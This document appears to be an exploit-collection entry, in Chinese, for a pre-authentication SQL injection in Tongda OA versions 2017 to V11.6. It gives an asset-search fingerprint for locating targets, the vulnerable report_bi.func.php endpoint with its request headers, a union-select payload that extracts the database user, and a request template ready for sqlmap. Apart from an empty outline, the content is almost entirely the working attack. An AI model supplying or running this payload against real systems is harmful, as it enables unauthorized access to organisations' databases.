# 通达OAreport_bi存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 113`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
_POST[dataset_id]=efgh'-@`'`)union select 1,2,user()#'&action=get_link_info&

sqlmap
POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 113
Content-Type: application/x-www-form-urlencoded
_POST[dataset_id]=efgh'-@`'`)&action=get_link_info&
```

**其他**
- 通达OA report\_bi存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2017-通达OA V11.6